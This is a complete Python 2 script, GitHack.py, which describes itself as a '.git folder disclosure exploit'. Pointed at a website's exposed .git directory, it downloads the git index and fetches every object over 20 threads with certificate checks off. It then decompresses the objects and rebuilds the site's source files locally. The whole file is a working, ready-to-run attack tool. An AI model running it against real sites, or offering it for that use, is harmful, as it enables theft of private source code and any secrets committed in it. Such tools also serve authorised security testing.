#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import sys
import urllib2
import os
import urlparse
import zlib
import threading
import Queue
import re
import time
from lib.parser import parse
import ssl

context = ssl._create_unverified_context()
if len(sys.argv) == 1:
    msg = """
A `.git` folder disclosure exploit. By LiJieJie

Usage: GitHack.py http://www.target.com/.git/

bug-report: my[at]lijiejie.com (http://www.lijiejie.com)
"""
    print msg
    sys.exit(0)


class Scanner(object):
    def __init__(self):
        self.base_url = sys.argv[-1]
        self.domain = urlparse.urlparse(sys.argv[-1]).netloc.replace(':', '_')
        if not os.path.exists(self.domain):
            os.mkdir(self.domain)
        print '[+] Download and parse index file ...'
        data = self._request_data(sys.argv[-1] + '/index')
        with open('index', 'wb') as f:
            f.write(data)
        self.queue = Queue.Queue()
        for entry in parse('index'):
            if "sha1" in entry.keys():
                self.queue.put((entry["sha1"].strip(), entry["name"].strip()))
                try:
                    print entry['name']
                except Exception as e:
                    pass
        self.lock = threading.Lock()
        self.thread_count = 20
        self.STOP_ME = False

    @staticmethod
    def _request_data(url):
        request = urllib2.Request(url, None, {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
        return urllib2.urlopen(request, context=context).read()

    def _print(self, msg):
        self.lock.acquire()
        try:
            print msg
        except Exception as e:
            pass
        self.lock.release()

    def get_back_file(self):
        while not self.STOP_ME:
            try:
                sha1, file_name = self.queue.get(timeout=0.5)
            except Exception as e:
                break
            for i in range(3):
                try:
                    folder = '/objects/%s/' % sha1[:2]
                    data = self._request_data(self.base_url + folder + sha1[2:])
                    try:
                        data = zlib.decompress(data)
                    except:
                        self._print('[Error] Fail to decompress %s' % file_name)
                    data = re.sub(r'blob \d+\00', '', data)
                    target_dir = os.path.join(self.domain, os.path.dirname(file_name))
                    if target_dir and not os.path.exists(target_dir):
                        os.makedirs(target_dir)
                    with open(os.path.join(self.domain, file_name), 'wb') as f:
                        f.write(data)
                    self._print('[OK] %s' % file_name)
                    break
                except urllib2.HTTPError, e:
                    if str(e).find('HTTP Error 404') >= 0:
                        self._print('[File not found] %s' % file_name)
                        break
                except Exception as e:
                    self._print('[Error] %s' % str(e))
        self.exit_thread()

    def exit_thread(self):
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def scan(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self.get_back_file)
            t.start()


if __name__ == '__main__':
    s = Scanner()
    s.scan()
    try:
        while s.thread_count > 0:
            time.sleep(0.1)
    except KeyboardInterrupt, e:
        s.STOP_ME = True
        time.sleep(1.0)
        print 'User Aborted.'
